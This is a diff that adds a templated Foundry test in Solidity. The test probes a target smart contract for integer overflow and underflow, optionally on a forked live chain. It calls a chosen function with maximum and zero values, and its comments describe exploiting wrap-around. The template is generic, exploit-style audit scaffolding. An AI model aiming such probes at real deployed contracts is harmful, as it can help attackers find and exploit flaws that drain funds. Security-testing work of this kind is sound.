@@ -1,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^{{ solc_version | default("0.8.20") }};
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+interface ITarget {
+    function {{ target_function }}({{ target_function_args | default("uint256") }}) external;
+}
+
+contract IntegerOverflowTest is Test {
+    ITarget public target;
+
+    {% if fork_url %}
+    uint256 internal fork;
+    {% endif %}
+
+    function setUp() public {
+        {% if fork_url %}
+        fork = vm.createSelectFork(
+            "{{ fork_url }}"{% if fork_block %},
+            {{ fork_block }}{% endif %}
+
+        );
+        {% endif %}
+
+        target = ITarget({{ target_contract }});
+        vm.label(address(target), "Target");
+    }
+
+    function test_integer_overflow() public {
+        // Attempt overflow with max uint256
+        uint256 overflowValue = type(uint256).max;
+
+        {% if pre_solc_0_8 %}
+        // Pre-0.8 contracts don't revert on overflow — exploit the wrap-around
+        target.{{ target_function }}({{ exploit_args | default("overflowValue") }});
+        console.log("Integer overflow succeeded (no revert)");
+        {% else %}
+        // Post-0.8: use unchecked context or find arithmetic bypass
+        // If the contract uses unchecked blocks or assembly, overflow is still possible
+        target.{{ target_function }}({{ exploit_args | default("overflowValue") }});
+        console.log("Arithmetic operation completed with extreme value");
+        {% endif %}
+    }
+
+    function test_integer_underflow() public {
+        // Attempt underflow with zero minus operation
+        uint256 underflowValue = 0;
+
+        target.{{ target_function }}({{ exploit_args | default("underflowValue") }});
+        console.log("Integer underflow test completed");
+    }
+}
